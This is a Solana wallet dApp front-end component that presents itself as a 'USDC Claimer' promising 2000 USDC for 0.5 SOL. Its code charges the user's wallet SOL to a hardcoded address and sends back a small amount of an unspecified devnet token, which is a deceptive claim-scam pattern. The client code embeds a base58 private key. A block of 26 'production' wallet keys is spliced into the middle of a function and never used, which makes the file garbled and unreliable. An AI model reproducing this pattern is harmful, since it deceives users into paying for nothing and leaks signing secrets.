/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "3eh7for75tUXnjbU8wAK3iA1yQyezocRYpBtijYLpxCmkycBUH7Utnb9joMDudAHp8c681Xk5spCPUwEBy7eYF3L"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "64Ms81oTaB7h7XZ7p1Jio2GRiubVksvnH5Ms75UPC69Y7Z7NzogL3BScr5SBGh2nLGHSPr6k3yet54deQBJfq66d",
  "key1": "ZQ3njTR3KpRpd8KCfR2fMAjJADJ3LrBdiCHzesSRV5waSAWaojZYk62dmKmxTAVsZ4gC6UcEj52V13vVb12X3b7",
  "key2": "62uUBe1FUKvWF1fvPfZ7u5HcjQj1DSPF95nwvUQB9nmA8kScmzkzuangiGFupYTnUjdRhX5v2ejME3hCePqDYR4Z",
  "key3": "49SMS4tD4KVqzywfPaT1xBEr6GNTzieDJY9TLMnZGARCQs2M8c5UCMaAkbTAo5HSiYvvv7WfABVrctNr5M883MTx",
  "key4": "5o8GW79Jizn5akb4o2xdy5r3rpBhptvNJrMa7yTATzWBAxuv6xADWji6fMDsdMs8bJN5piqknyDmvpXWJWUvyKFH",
  "key5": "3za8cm7g8SmwmYH4aLWFwJYEtUNPEco4jT8xaENqEjH13Hth7SktdskfZwHL9fhNqCYERv3yS8zk8JjHmVYMTunF",
  "key6": "4DL83VyQ5C2oFF4kLj3a2STavqrXx8FWi9mpPZbxsfHR7VTLAP37WrBSE19wPN1hbiyBmT6JbjhuZkB1A48NTYgs",
  "key7": "28N6ssonCu3vWMrv9fPtFrpkDBMMFs8QFMxE3n7jSHVZxnhn4ssFzg7Sdp4zJudPHmSDiQrUJoKaeKV9R7UEQpKT",
  "key8": "5o61kzJWKovqKVchSB1uDGKwMMFL7vRmogn8fbscSL9FmJPnWYCdfyNygdVJe9Qq5C11VfxiNEwTpqdaVNGgt1D3",
  "key9": "64LUqGUQyfmDamhY6Zn1wBQi2yDHJa66QJ8GPnfCBJHxdHtytb51sdDGj2XNDsUqXrE4Jb3h5YyVwugZYkZLCbdc",
  "key10": "23fMPQH855gh2TEKiAp1TyP78Ygz5B1EXWSawcfjR1Pq3aehQoWMgXCpDv7s8js2cv9cutg6kyeUxtT1UwnHNcHR",
  "key11": "2AxBpVAzBgPtE8LLhFtKvCMk9UghFE3t1jVf8PaN7PLaswSuY1UufakzVBxHe1RoAWt1E6J8GCY5NFHvD9XzdorQ",
  "key12": "4xwnZAyUyAxgETzbTqdtjZGSafnYSJwVcPzYjYgHZ8LRFjUmFy5jx1aDTVowFFx13uhsBrdxN18bvnWQrGxhM4Ah",
  "key13": "4EXvggS2TJepaj93RWEQXeNdKcu2tQY4AQ7j3X1o5UxDzQKVBjDq3FrKgSLNtiMQRoCaK7nFMcA6i4BBHTjMAhiu",
  "key14": "67nZXf8wuu1tuXyxLNf2XGd5fw51o1kaymXQPtTDg8aA5fVuErMPFz8AVMqyExuX4SfA6h5UknESw1uZr4XR5SEN",
  "key15": "5JPDLV4rnjThPNdhLAkC8muK4CwzV2n9d2TkMob61EjhWWWJiHRuBcxvfSowvZTPBF5iKhDNhduoSQV8b4vWBHNV",
  "key16": "yoLRgQ785bYWkey5ntNuNCKRjqHPSLmjsLYt3jrNnyP9zZofA9wKHmLtnerq1WPrwSBkuotYq1hvqvfTbhfv58S",
  "key17": "5Q2qtQMYJQMdRVnR3zYEs8w53sCcdehecV7VDGuHoGCZFR6uiRuNzRjBePKZcZ8yEtFgnBfcQygj3qAcrzSRP3pt",
  "key18": "3m7vp6bySGraV6PqTzm2bMNMM6t6XtCEqc2Jx1HsE5tWRhRTLHbZndQ6cXBAPgF3mcrMVJ3y48jUdvfR2KJfEzPb",
  "key19": "3pD3CtNSc3A77xnAojPkvnCLkVjheruoeAeddH7FPfkwsvv5D9ofRETNmPowaofN2f13MpMUa1fSFMUx7t8Kfzp1",
  "key20": "368S4cdGAZz1pzF299CKZnYjFMDNjzBKLsWZt2ez4P2jgkymgTPzPrrLzr7VTDHcFeVJk9LZ6fPhteNjYFE4q1XN",
  "key21": "4xJTgU75gdGo7gdpnAUy5avhGxtRXa4gk68D5cVDnCj5ZrRJYU7NDGXYMN9EPKM3rnF5KfHafhVUxTbjzcuXFCph",
  "key22": "3JRxA4YBKfWMh2TrtSicm68bgkmT29gMVss8fxoFfUteidd2rAM27mkTduFKynZX5DretqxSDesvm3VB3z1t8Njd",
  "key23": "beUBDJ2G45CqYvtLdYRu9qRtBVF51ULyFGVCXkcKqLL8H1wQt3Es7oh7ZTnLJTv8KNhPFRFwVs5hvd85Scts53A",
  "key24": "2UkfsD2xdZY3gRkFzhnF4yKBtTWFUcr6Jy2bXbWvnfFqDG6nNaaiwzuNYvoouPJNBRRQY9MnBbPYPDUzKa7HuBTz",
  "key25": "2hVN7RxbNFAc4ba2MHM9qXNKva4FjwFRMRg6AR9zZVc4LJeksk2ieQZWLpt1Xni5akWucFoMHLFrYoPpXgzF7ZiA"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
